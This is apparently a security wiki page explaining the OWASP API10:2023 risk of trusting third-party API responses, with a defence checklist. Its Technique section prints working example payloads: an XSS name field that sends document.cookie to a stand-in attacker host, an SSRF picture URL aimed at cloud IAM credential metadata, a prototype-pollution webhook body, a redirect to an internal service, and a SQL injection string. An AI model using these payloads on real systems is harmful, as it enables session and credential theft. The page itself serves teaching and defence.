---
title: Unsafe consumption of third-party APIs
slug: api-unsafe-consumption
---

> **TL;DR:** OWASP API10:2023. Your backend treats responses from suppliers (Twilio, Stripe, OAuth providers, partner APIs) as trusted, so any injection or SSRF in those responses lands inside your trust boundary.

## What it is
API10:2023 — Unsafe Consumption of APIs covers the inverse direction of most API risks: instead of the attacker hitting your endpoint directly, they poison an upstream the attacker also controls or influences (a webhook source, an OAuth `userinfo` endpoint, a public-data API, a sub-supplier feeding into your aggregator). Your code reads the response and forwards it into a database, a renderer, a `eval`/template, an HTTP client, or another internal service. Classic chains are SSRF via redirect-following on a partner URL, SQLi from a JSON field copied into a query, prototype pollution from a webhook body, and XSS via a profile picture URL that the supplier never sanitised.

## Preconditions / where it applies
- Server-to-server integrations: webhooks, OAuth/OIDC, KYC providers, payment processors, SMS gateways, weather/sports/news feeds
- Aggregator APIs (price comparison, travel meta-search) that re-emit upstream content
- Code paths that copy supplier fields into HTML, SQL, shell, MongoDB queries, or internal HTTP calls without re-validation
- Trust based on TLS or HMAC alone — both prove origin, not safety of content

## Technique
**OAuth userinfo poisoning.** Register a malicious OIDC provider (or compromise one) and return a payload your relying party renders:

```json
{
  "sub": "u123",
  "email": "victim@corp.tld",
  "name": "<img src=x onerror=fetch('https://oast.attacker/'+document.cookie)>",
  "picture": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

If the SPA renders `name` unescaped, you get stored XSS scoped to every account that ever linked your IdP. If the backend fetches `picture` server-side for caching, you get SSRF to cloud metadata.

**Webhook prototype pollution.** A Stripe-like webhook handler that does `Object.assign({}, JSON.parse(body))` and then merges into a config object:

```json
{"type":"charge.succeeded","data":{"__proto__":{"isAdmin":true}}}
```

Downstream `if (user.isAdmin)` checks now pass for every user.

**Redirect-chain SSRF.** Partner API returns `Location: http://127.0.0.1:8500/v1/kv/?recurse` and your HTTP client (axios, requests) follows redirects by default to internal services.

**SQLi via supplier field.** Aggregator queries upstream by ISBN, then `INSERT INTO books (title) VALUES ('${upstream.title}')`. Supplier title field carries `', (SELECT current_user)) -- `.

Use OAST callbacks (see [[oast-out-of-band-testing]]) to confirm whether the consuming service fetches URLs it received.

## Detection and defence
- Treat every upstream response as untrusted input — schema-validate (JSON Schema, zod, pydantic) with allow-lists of fields and types before use
- Disable HTTP redirect-following on server-side clients, or pin to a host allowlist
- Never deserialise webhook bodies into a shared object without `Object.create(null)` or a safe parser
- Egress firewall: outbound to known supplier IP ranges only; block link-local and RFC1918 from app pods
- Log correlation IDs across supplier-call and downstream-use so a poisoned response can be traced

## References
- [OWASP API10:2023 Unsafe Consumption of APIs](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/) — official class
- [PortSwigger: SSRF via OpenID dynamic client registration](https://portswigger.net/research/hidden-oauth-attack-vectors) — supplier-side trust pivot

See also: [[ssrf]], [[mass-assignment]], [[api-authentication-attacks]].
